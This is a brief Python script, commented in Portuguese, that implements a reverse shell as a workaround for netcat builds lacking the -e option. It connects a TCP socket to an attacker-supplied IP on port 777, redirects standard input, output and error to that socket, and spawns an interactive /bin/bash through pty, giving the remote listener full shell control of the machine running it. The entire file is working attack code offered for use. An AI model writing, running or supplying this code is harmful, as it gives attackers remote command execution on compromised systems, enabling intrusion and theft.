#reverse_shell usando python
#Uma boa parte dos novos distros linux não tem a opção -e do netcat, então usaremos o Python para fazer uma conexão reversa
#Vou fazer muitas mekhorias ainda, nesse momento atende só a distribuições linux, quero melhorar ele bastante

import pty, os, socket, sys

ip = sys.argv[1]
porta = 777

s = socket.socket()   #socket
s.connect((ip, porta)) #conectando o socket TCP/IP no IP e porta alvo que estarão escutando (atacante)

for fd in (0, 1, 2):   #códigos de saida,entrada e erro no linux
    os.dup2(s.fileno(), fd)

pty.spawn("/bin/bash")  #Fazer conexao reversa /bin/bash com o pty

